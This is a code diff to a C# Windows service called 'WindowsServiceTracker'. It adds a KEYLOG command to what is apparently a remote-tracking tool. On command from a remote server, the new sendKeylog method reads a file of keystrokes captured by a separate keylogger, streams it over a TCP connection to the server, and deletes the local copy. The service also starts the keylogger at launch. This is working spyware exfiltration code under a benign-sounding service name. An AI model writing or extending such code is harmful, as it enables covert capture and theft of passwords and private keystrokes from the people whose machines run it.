@@ -30,6 +30,7 @@ namespace WindowsServiceTracker
         public const byte KEYLOG_ON = 0;
         public const byte KEYLOG_OFF = 1;
         public const byte TRACE_ROUTE = 2;
+        public const byte KEYLOG = 3;
         private const int PORT = 10011;
         private const string ERROR_LOG_NAME = "TrackerErrorLog";
         private const string ERROR_LOG_MACHINE = "TrackerComputer";
@@ -45,6 +46,7 @@ namespace WindowsServiceTracker
         private Thread tcpThread;
         private volatile bool tcpKeepAlive = true;
         private volatile string macAddress = null;
+        private volatile String keyLogFilePath;
 
         // Variables in this block are intended to be used only with the thread
         // maintaining the tcp connection. They are not thread safe and should
@@ -92,6 +94,7 @@ namespace WindowsServiceTracker
             ipPort = new IPEndPoint(ipAddress, PORT);
 
             CreateOpenPipe();
+            keyLogFilePath = GetKeylogFilePath();
             StartKeylogger(); //todo remove after debugging
 
             tcpThread = new Thread(this.MaintainServerConnection);
@@ -138,6 +141,17 @@ namespace WindowsServiceTracker
                 return pipeProxy.StopKeylogger();
             }
             return false;
+        }
+
+        /* Get location of keylog file
+         */
+        public String GetKeylogFilePath()
+        {
+            if (CheckIfRunning())
+            {
+                return pipeProxy.GetKeylogFilePath();
+            }
+            return String.Empty;
         }
 
         //Checks to see if the keylogger program is running
@@ -258,6 +272,9 @@ namespace WindowsServiceTracker
                                     case TRACE_ROUTE:
                                         sendTraceRouteInfo();
                                         break;
+                                    case KEYLOG:
+                                        sendKeylog();
+                                        break;
                                     default:
                                         break;
                                 }
@@ -363,6 +380,60 @@ namespace WindowsServiceTracker
 
             }
             return ipString;
+        }
+
+        /* sends the contents of the keylog file to the server
+         * and deletes it.
+         */
+        private bool sendKeylog()
+        {
+            bool success = true;
+            StreamReader log;
+            String tempFile = "tempFile.txt";
+            int bufferSize = 1024;
+            char[] buffer = new char[bufferSize];
+            int bytesRead;
+            byte[] msg;
+            try
+            {
+                File.Move(keyLogFilePath, tempFile);
+                log = new StreamReader(tempFile);
+            }
+            catch (Exception)
+            {
+                return false;
+            }
+
+            try
+            {
+                msg = new byte[1];
+                msg[0] = KEYLOG;
+                tcpStream.Write(msg, 0, msg.Length);
+
+                while (!log.EndOfStream)
+                {
+                    bytesRead = log.Read(buffer, 0, bufferSize);
+                    msg = Encoding.UTF8.GetBytes(buffer, 0, bytesRead);
+                    tcpStream.Write(msg, 0, msg.Length);
+                }
+
+                msg = Encoding.UTF8.GetBytes(Environment.NewLine);
+                tcpStream.Write(msg, 0, msg.Length);
+            }
+            catch (Exception)
+            {
+                success = false;
+            }
+
+            try
+            {
+                File.Delete(tempFile);
+            }
+            catch (Exception)
+            {
+                //return false;
+            }
+            return success;
         }
     }
 }
